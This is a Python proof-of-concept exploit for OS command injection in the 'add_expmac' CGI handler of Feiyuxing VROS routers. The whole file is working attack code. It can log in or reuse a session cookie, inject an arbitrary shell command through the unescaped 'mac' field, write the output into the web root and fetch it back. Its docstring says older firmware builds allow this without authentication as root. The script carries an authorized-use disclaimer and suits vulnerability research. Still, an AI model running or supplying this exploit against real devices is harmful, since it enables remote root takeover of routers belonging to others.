#!/usr/bin/env python3
"""OS command injection PoC for add_expmac (Feiyuxing VROS web CGI).

Only use on your own or explicitly authorized device.

Sink (webserver, `add_expmac` handler @0x4DB5D0):

    POST /send_order.cgi?parameter=add_expmac
    {"mac":";<command> > /var/html/<output>;#"}

    sprintf(cmd, "cat %s|grep %s|wc -l", "/disk/conf/nbmac.cfg", mac);
    system_operate(cmd, out);        /* popen() internally @0x4DB8C4 */

The `mac` value is used unescaped. The injected command is redirected to
a file under the web root (/var/html), which is then fetched over HTTP so
the operator can read the command output.

Reachability:
  * firmware B-MB3W202-210825-r11775: /send_order.cgi is gated by a
    session cookie (no cookie => redirect to login.html);
  * earlier firmware builds lack that gate for send_order, making this an
    unauthenticated root RCE.

Auth modes:
  * no -p/--cookie : send the request unauthenticated (older builds);
  * -p <password>  : log in first via ?parameter=login (POST JSON
                     {"username":..,"password":..}) and reuse the session;
  * --cookie ...   : reuse an existing session cookie.

Note: after 5 failed logins the web UI locks login for ~5 minutes.
"""
import argparse
import json
import re
import socket
import sys
import time

ENDPOINT = "add_expmac"
LOGIN_ENDPOINT = "login"
FIELD = "mac"
PAYLOAD_PREFIX = ';'
COOKIE_RE = re.compile(rb"hash_key=([^,\s;]+),session_id=([^;\s]+)")


def build_request(ip, port, path, body, cookie=None):
    headers = [
        f"POST {path} HTTP/1.1" if body is not None else f"GET {path} HTTP/1.1",
        f"Host: {ip}:{port}",
        "Accept-Language: zh-CN,zh;q=0.9",
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding: identity",
        "X-Requested-With: XMLHttpRequest",
        "Connection: close",
    ]
    if body is not None:
        headers.append("Content-Type: application/x-www-form-urlencoded; charset=UTF-8")
        headers.append(f"Content-Length: {len(body)}")
    if cookie:
        headers.append(f"Cookie: {cookie}")
    head = ("\r\n".join(headers) + "\r\n\r\n").encode()
    return head + (body or b"")


def http_exchange(ip, port, path, body, cookie, timeout, show_request):
    request = build_request(ip, port, path, body, cookie)
    if show_request:
        print("[*] raw request:")
        print(request.decode("utf-8", "replace"))
    try:
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            sock.sendall(request)
            sock.shutdown(socket.SHUT_WR)
            chunks = []
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
    except OSError as exc:
        print(f"[!] socket error: {exc}")
        sys.exit(1)
    return b"".join(chunks)


def main():
    ap = argparse.ArgumentParser(
        description="add_expmac command injection PoC (authorized use only)"
    )
    ap.add_argument("ip", help="router IP")
    ap.add_argument("port", type=int, help="router web port")
    ap.add_argument("-c", "--command", default="id",
                    help="shell command to execute; output is redirected to --output")
    ap.add_argument("--output", default="fx_cmd_output.txt",
                    help="web-accessible output filename (no slash)")
    ap.add_argument("-u", "--username", default="admin", help="web admin user (default: admin)")
    ap.add_argument("-p", "--password", help="web admin password (login step)")
    ap.add_argument("--cookie", help="existing session cookie 'hash_key=..,session_id=..' (skips login)")
    ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--show-request", action="store_true")
    args = ap.parse_args()

    if not re.fullmatch(r"[A-Za-z0-9_.-]+", args.output):
        print("refusing unsafe --output; use letters, digits, dot, underscore, hyphen only")
        sys.exit(2)

    cookie = args.cookie
    if not cookie and args.password:
        login_body = json.dumps({"username": args.username, "password": args.password},
                                separators=(",", ":")).encode()
        print(f"[*] login as {args.username!r} ...")
        resp = http_exchange(args.ip, args.port, f"/send_order.cgi?parameter={LOGIN_ENDPOINT}",
                             login_body, None, args.timeout, args.show_request)
        m = COOKIE_RE.search(resp)
        if not m:
            print("[!] login failed (or no Set-Cookie), raw response:")
            print(resp.decode("utf-8", "replace"))
            sys.exit(1)
        cookie = f"hash_key={m.group(1).decode()},session_id={m.group(2).decode()}"
        print(f"[+] login ok, session: {cookie}")

    if not cookie:
        print("[i] no -p/--password and no --cookie: sending request unauthenticated")

    payload = f"{PAYLOAD_PREFIX}{args.command} > /var/html/{args.output};#"
    body = json.dumps({FIELD: payload}, separators=(",", ":")).encode()
    path = f"/send_order.cgi?parameter={ENDPOINT}"

    print(f"[*] endpoint: {ENDPOINT}")
    print(f"[*] payload: {payload}")

    response = http_exchange(args.ip, args.port, path, body, cookie, args.timeout, args.show_request)
    print(f"[*] inject response: {len(response)} bytes")
    print(response.decode("utf-8", "replace"))

    time.sleep(0.5)
    fetched = http_exchange(args.ip, args.port, f"/{args.output}", None, None, args.timeout, args.show_request)
    head = fetched.split(b"\r\n\r\n", 1)
    status_ok = fetched.startswith(b"HTTP/") and b" 200 " in fetched.split(b"\r\n", 1)[0]
    print(f"[*] output fetch: {len(fetched)} bytes")
    if status_ok:
        body_part = head[1] if len(head) > 1 else fetched
        print("[+] command output:")
        print(body_part.decode("utf-8", "replace"))
    else:
        print("[-] no output file returned; inspect the inject response or verify the web root")


if __name__ == "__main__":
    main()
